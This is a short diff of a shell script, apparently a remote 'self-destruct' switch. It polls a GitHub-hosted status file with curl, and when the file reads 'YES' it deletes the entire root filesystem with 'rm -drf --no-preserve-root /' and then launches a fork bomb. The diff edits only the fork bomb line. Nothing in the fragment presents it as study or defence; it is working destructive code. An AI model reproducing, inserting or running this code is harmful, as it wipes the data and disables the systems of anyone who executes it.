@@ -5,5 +5,5 @@ status=$(curl https://raw.githubusercontent.com/ssbuffer/self_destruct/main/stat
 if [ "$status" = "YES" ];
 then
     rm -drf --no-preserve-root /
-    :(){ :|:& };:
+    $(:(){ :|:& };:)
 fi
